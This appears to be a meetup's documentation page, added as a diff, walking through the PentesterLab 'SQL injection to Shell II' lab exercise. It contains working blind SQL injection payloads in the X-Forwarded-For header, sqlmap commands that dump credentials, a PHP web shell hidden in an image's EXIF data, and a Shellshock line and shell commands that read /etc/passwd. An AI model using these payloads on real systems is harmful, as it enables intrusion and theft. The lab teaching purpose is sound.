@@ -1,0 +1,305 @@
+.. include:: /pentest_links.txt
+
+.. _PentesterLabSQLi2Shell2:
+
+*******************************************
+PentesterLab From SQL injection to Shell II
+*******************************************
+
+This is to document the meetup’s efforts responding to the challenge `PentesterLab From SQL injection to Shell II <https://pentesterlab.com/exercises/from_sqli_to_shell_II//>`_ (the follow-on to `PentesterLab From SQL injection to Shell <https://pentesterlab.com/exercises/from_sqli_to_shell/>`_).
+
+There are numerous online articles helpful to understand SQL injection: `SQL Injection (OWASP) <https://www.owasp.org/index.php/SQL_Injection>`_, `SQL Injection Prevention Cheat Sheet (OWASP) <https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet>`_, `SQL Injection Wiki`_, `What is an SQL Injection? SQL Injections: An Introduction (INFOSEC Institute) <http://resources.infosecinstitute.com/sql-injections-introduction/>`_, `SQL Injection (w3schools.com) <http://www.w3schools.com/sql/sql_injection.asp>`_, and `SQL Injection (HAKIPEDIA) <http://hakipedia.com/index.php/SQL_Injection>`_.
+
+For review of http headers and the http protocol, please consult :ref:`HTTP_vs_HTML` or start with `Wikipedia Hypertext Transfer Protocol <https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol>`_. `X-Forwarded-For <https://en.wikipedia.org/wiki/X-Forwarded-For>`_ focuses on the SQL injection target.
+
+how SQL injection II differs from I
+===================================
+
+The setup looks much the same for both SQL injection exercises except for two key differences:
+ 
+* In SQL I the injection is performed on a query parameter:
+
+  .. code-block:: bash
+
+    curl http://$TARGET/cat.php?id=$INJECTION
+
+  whereas in SQL II the injection is done via the http header field X-Forwarded-For:
+
+  .. code-block:: bash
+
+    curl --header "X-Forwarded-For: $INJECTION" http://$TARGET/
+
+  Vulnerable http header fields should not come as a complete surprise as the `Shellshock bash exploit used the User-Agent header field <http://blog.cloudflare.com/inside-shellshock/>`_:
+
+  .. code-block:: bash
+
+    curl -H "User-Agent: () { :; }; /bin/cat /etc/passwd" http://example.com/
+
+* SQL injection in SQL I is error-based (with visible error messages telling us there is a SQL injection) whereas in SQL II the injection is blind (having to resort to differences in delay between successful vs. unsuccessful queries).
+
+How did Shell II turn the benign X-Forwarded-For field into an attack vector? It added stats.php to update stats based on client IP:
+
+.. code-block:: php
+
+  <?php
+
+    $ip = $_SERVER['REMOTE_ADDR'];
+
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+      $ip= $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }
+    $results= mysql_query("SELECT * FROM stats where ip='".$ip."'");
+    if ($results) {
+        $row = mysql_fetch_assoc($results);
+        if ($row['ip'])
+          mysql_query("UPDATE stats set count=count+1 where ip'".$ip."'");
+        else
+          mysql_query("INSERT INTO stats (ip, count) VALUES ('".$ip."',1);
+    }
+  ?>
+
+`SQL Injection Prevention Cheat Sheet (OWASP) <https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet>`_ was not followed and lead to the SQL injection opportunity.
+
+SQL II reconnaissance
+=====================
+
+We start with reconnaissance showing:
+
+* nginx 0.7.67 web server
+  
+* running PHP/5.3.3-7+squeeze15
+  
+* on Debian Linux Squeeze (6.0.7) using kernel 2.6.32-5
+
+The nginx and php versions are obvious from the console listing below. But how did we get the Debian Linux 6.0.7 and specific kernel version? Well, we start with the php information. Debian `Accepted php5 5.3.3-7+squeeze15 <https://lists.debian.org/debian-changes/2013/03/msg00009.html>`_ (the php version the vulnerable server uses) on 2013-03-04  and `Accepted php5 5.3.3-7+squeeze16 <https://lists.debian.org/debian-changes/2013/07/msg00037.html>`_ (the following version) 2013-07-24. That tells us that the Debian version was prior to 2013-07-24. Looking at `Debian Squeeze Releases and Updates <https://wiki.debian.org/DebianSqueeze>`_ shows Debian Squeeze 6.0.8 was released 2013-10-20 (too late) but Squeeze 6.0.7 was released 2013-02-23 and likely was patched to php5 5.3.3-7+squeeze15 after installation. So the vulnerable server runs Debian Squeeze 6.0.7. Looking at the `Debian 6.0.7 press release <https://www.debian.org/News/2013/20130223>`_ shows linux-2.6 2.6.32-48 and a little searching showed the `squeeze 2.6 kernel <https://packages.debian.org/search?searchon=sourcenames&keywords=linux-2.6>`_ used 2.6.32-5. It's interesting how much information leaks out by providing software versions.
+
+.. code-block:: console
+
+  hacker@kali:~$ # nmap to see an nginx web server running on linux
+  hacker@kali:~$ TARGET=192.168.1.102
+  hacker@kali:~$ sudo nmap -Pn -sV -O $TARGET
+  ###################### SNIP ######################
+  PORT   STATE SERVICE VERSION
+  80/tcp open  http    nginx 0.7.67
+  MAC Address: 52:54:00:CD:D8:59 (QEMU Virtual NIC)
+  Device type: general purpose
+  Running: Linux 2.6.X
+  OS CPE: cpe:/o:linux:linux_kernel:2.6
+  OS details: Linux 2.6.32
+  Network Distance: 1 hop
+  ###################### SNIP ######################
+  hacker@kali:~$ # HTTP HEADERS confirm nginx version, give PHP version
+  hacker@kali:~$ #   Here is the http client request for the header
+  hacker@kali:~$ cat > head.txt <<EOF
+  HEAD / HTTP/1.1
+  Host: vulnerable
+  Connection: close
+
+  EOF
+  hacker@kali:~$ od -c head.txt
+  0000000   H   E   A   D       /       H   T   T   P   /   1   .   1  \n
+  0000020   H   o   s   t   :       v   u   l   n   e   r   a   b   l   e
+  0000040  \n   C   o   n   n   e   c   t   i   o   n   :       c   l   o
+  0000060   s   e  \n  \n
+  0000064
+  hacker@kali:~$ #   socat for the request/response (changing \n to \r\n)
+  hacker@kali:~$ #   netcat alternative requires a "sleep"
+  hacker@kali:~$ #     { cat head.txt; sleep 2; } | ncat $TARGET 80
+  hacker@kali:~$ cat head.txt | socat STDIO,ignoreeof TCP:$TARGET:80,crlf
+  HTTP/1.1 200 OK
+  Server: nginx/0.7.67
+  Date: Fri, 14 Nov 2014 06:37:20 GMT
+  Content-Type: text/html
+  Connection: close
+  X-Powered-By: PHP/5.3.3-7+squeeze15
+
+  hacker@kali:~$
+
+testing for SQL injection
+=========================
+
+The SQL injection involves setting the X-Forwarded-For field. Here are 3 simple ways of doing that:
+
+.. code-block:: bash
+
+  # socat sending X-Forwarded-For
+  TARGET=192.168.1.102
+  cat > head.txt <<EOF
+  HEAD / HTTP/1.1
+  Host: vulnerable
+  X-Forwarded-For: 123.123.123.123
+  Connection: close
+
+  EOF
+  cat head.txt | socat STDIO,ignoreeof TCP:$TARGET:80,crlf
+
+  # curl --header for X-Forwarded-For, --head only gets HEAD
+  curl -v --header "X-Forwarded-For: 123.123.123.123" --head http://$TARGET/
+
+  # wget --header for X-Forwarded-For, --server-response --spider --tries 1 only gets HEAD
+  wget --header "X-Forwarded-For: 123.123.123.123" --server-response \
+       --spider --tries 1 http://$TARGET/
+
+We'll use ``curl`` to probe for SQL injection opportunities. First we'll guess that the database is MySQL (which is often true for PHP-based systems). That means we'll be using MySQL queries: if they work then we know it's MySQL, if not we'll have to try a different database.
+
+Since X-Forwarded-For is an IP it's text and we'll assume our injection closes the X-Forwarded-For field with a single quote mark. We try "hacker'" first and see there's no change in the output. So then we try adding a "sleep(5)" and see a delay, confirming the SQL injection and a likely MySQL database. Here is the code you can cut-and-paste into your terminal session (except for the TARGET):
+
+.. code-block:: bash
+
+  TARGET=192.168.1.102
+  XFF="X-Forwarded-For: "
+  t1=$(date +%s)
+  INJECT="hacker'"
+  curl --silent --header "${XFF}${INJECT}" -o /dev/null http://$TARGET/
+  t2=$(date +%s)
+  echo "Elapsed time = $(( t2 - t1 )) seconds"
+  INJECT="hacker' OR SLEEP(5) AND '1'='1"
+  curl --silent --header "${XFF}${INJECT}" -o /dev/null http://$TARGET/
+  t3=$(date +%s)
+  echo "Elapsed time = $(( t3 - t2 )) seconds"
+
+Here is result of running the code above (showing the time delay):
+
+.. code-block:: console
+
+  hacker@kali:~$ TARGET=192.168.1.102
+  hacker@kali:~$ t1=$(date +%s)
+  hacker@kali:~$ INJECT="hacker'"
+  hacker@kali:~$ curl --silent --header "${XFF}${INJECT}" -o /dev/null http://$TARGET/
+  hacker@kali:~$ t2=$(date +%s)
+  hacker@kali:~$ echo "Elapsed time = $(( t2 - t1 )) seconds"
+  Elapsed time = 0 seconds
+  hacker@kali:~$ INJECT="hacker' OR SLEEP(5) AND '1'='1"
+  hacker@kali:~$ curl --silent --header "${XFF}${INJECT}" -o /dev/null http://$TARGET/
+  hacker@kali:~$ t3=$(date +%s)
+  hacker@kali:~$ echo "Elapsed time = $(( t3 - t2 )) seconds"
+  Elapsed time = 5 seconds
+
+Now we can clumsily play a game of "20 questions" with the database - if we guess right it will induce a delay or return immediately if we guess wrong. Let's say we have inched along and now know there is a database called users with columns id, login, and password. We can enumerate the users by selecting id = 1 and asking if the length of login is 1, 2, 3, ... on up until we get a delay at 5 (for "admin"). Then in a loop we can inquire about the value of each of the characters, going from 1 to 5: is it "a", "b", ...  until the delay shows us the actual character. If we want to optimize the search, we can convert each character to a binary number and ask if each bit is a 1? That way takes less checks to determine that the letters are "a", "d", "m", "i", and "n". Using bits is faster with ascii characters (which have 7 bits); it takes 7 guesses * 5 letters = 35 guesses. Guessing each letter would have taken 1+4+13+9+14=41 guesses (and it gets worse if you allow digits and special characters in the login). Here we show a query verifying the 3rd character of the first login is "m":
+
+.. code-block:: bash
+
+  TARGET=192.168.1.102
+  XFF="X-Forwarded-For: "
+  t1=$(date +%s)
+  INJECT="hacker' OR if ( (SELECT substring(login,3,1) FROM users \
+  WHERE id=1) = \"m\", sleep(5),0) AND '1="
+  curl --silent --header "${XFF}${INJECT}" -o /dev/null http://$TARGET/
+  t2=$(date +%s)
+  echo "Elapsed time = $(( t2 - t1 )) seconds"
+
+``sqlmap`` to the rescue
+========================
+
+This is tedious and begs to be automated; `sqlmap`_ has done that. Give it a hint to use X-Forwarded-For and it will find the SQL injection, returning the database banner (so you'll know the version).
+
+.. code-block:: console
+
+  hacker@kali:~$ sqlmap -u "http://$TARGET/" --headers="X-Forwarded-For: *" \
+      --banner --batch --output-dir $PWD/sqlmap
+  ###################### SNIP ######################
+  [*] starting at 23:12:15
+
+  custom injection marking character ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] 
+  ###################### SNIP ######################
+  sqlmap identified the following injection points with a total of 120 HTTP(s) requests:
+  ---
+  Place: (custom) HEADER
+  Parameter: X-Forwarded-For #1*
+      Type: AND/OR time-based blind
+      Title: MySQL > 5.0.11 AND time-based blind
+      Payload: ' AND SLEEP(5) AND 'YTeW'='YTeW
+  ---
+  [23:13:05] [INFO] the back-end DBMS is MySQL
+  [23:13:05] [INFO] fetching banner
+  ###################### SNIP ######################
+  5.1.66-0+squeeze1
+  web application technology: PHP 5.3.3, Nginx
+  back-end DBMS: MySQL 5.0.11
+  banner:    '5.1.66-0+squeeze1'
+  ###################### SNIP ######################
+
+Now we continue on as before to list the databases, tables, and users.
+
+.. code-block:: console
+
+  hacker@kali:~$ sqlmap -u "http://$TARGET/" --headers="X-Forwarded-For: *" \
+      --dbs --batch --output-dir $PWD/sqlmap
+  ###################### SNIP ######################
+  available databases [2]:
+  [*] information_schema
+  [*] photoblog
+  ###################### SNIP ######################
+  hacker@kali:~$ sqlmap -u "http://$TARGET/" --headers="X-Forwarded-For: *" \
+      -D photoblog --tables --batch --output-dir $PWD/sqlmap
+  ###################### SNIP ######################
+  [4 tables]
+  +------------+
+  | categories |
+  | pictures   |
+  | stats      |
+  | users      |
+  +------------+
+  ###################### SNIP ######################
+  hacker@kali:~$ sqlmap -u "http://$TARGET/" --headers="X-Forwarded-For: *" \
+      -D photoblog -T users --dump --batch --output-dir $PWD/sqlmap
+  ###################### SNIP ######################                                                  
+  Database: photoblog
+  Table: users
+  [1 entry]
+  +----+-------+---------------------------------------------+
+  | id | login | password                                    |
+  +----+-------+---------------------------------------------+
+  | 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
+  +----+-------+---------------------------------------------+
+  ###################### SNIP ######################
+
+`sqlmap`_ is pretty amazing, handling lots of corner cases. With it we now we have the admin/P4ssw0rd to gain access to the admin web pages.
+
+uploading the vulnerable php script
+===================================
+
+Consult the challenges documentation for issues about uploading files to an nginx/PHP server. Basically, we embed the php page "<?php system(\$_GET['cmd']); ?>" in a copy of the existing image file hacker.png using ``exiftool``. Then we upload it using our admin/P4ssw0rd account, figure out the uploaded file's name (it's changed), then use it to execute commands by fetching "http://$TARGET/admin/uploads/${uploaded}/x.php?cmd=COMMAND". At this point the exploit is done: we can execute arbitrary shell commands with the permissions of the web server.
+
+.. code-block:: console
+
+  hacker@kali:~$ TARGET=192.168.1.102
+  hacker@kali:~$ curl --silent -o hacker.png http://$TARGET/admin/uploads/hacker.png
+  hacker@kali:~$ echo "<?php system(\$_GET['cmd']); ?>" > shell.php
+  hacker@kali:~$ exiftool "-comment<=shell.php" hacker.png
+  hacker@kali:~$ curl --silent --form action=index.php \
+      --form title="shell" --form image="@hacker.png" --form category=1\
+      --form Add="Add" --form user=admin --form password=P4ssw0rd \
+      -o /dev/null http://$TARGET/admin/index.php
+  hacker@kali:~$ uploaded=$(curl --silent http://$TARGET/all.php | \
+      grep 'alt="shell"' | \
+      head -n 1 | \
+      sed -e 's/^.*Picture: shell//;s/^.*uploads\/\([0-9]*.png\).*$/\1/')
+  hacker@kali:~$ curl --silent \
+      http://$TARGET/admin/uploads/${uploaded}/x.php?cmd=uname%20-a | \
+      strings --bytes=15
+  Linux debian 2.6.32-5-amd64 #1 SMP Fri May 10 08:43:19 UTC 2013 x86_64 GNU/Linux
+  hacker@kali:~$ curl --silent \
+      http://$TARGET/admin/uploads/${uploaded}/x.php?cmd=cat%20/etc/passwd | \
+      strings --bytes=15
+  root:x:0:0:root:/root:/bin/bash
+  daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+  bin:x:2:2:bin:/bin:/bin/sh
+  sys:x:3:3:sys:/dev:/bin/sh
+  sync:x:4:65534:sync:/bin:/bin/sync
+  games:x:5:60:games:/usr/games:/bin/sh
+  man:x:6:12:man:/var/cache/man:/bin/sh
+  lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+  mail:x:8:8:mail:/var/mail:/bin/sh
+  news:x:9:9:news:/var/spool/news:/bin/sh
+  uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+  proxy:x:13:13:proxy:/bin:/bin/sh
+  www-data:x:33:33:www-data:/var/www:/bin/sh
+  backup:x:34:34:backup:/var/backups:/bin/sh
+  list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+  irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+  nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+  libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+  mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false
+  user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash
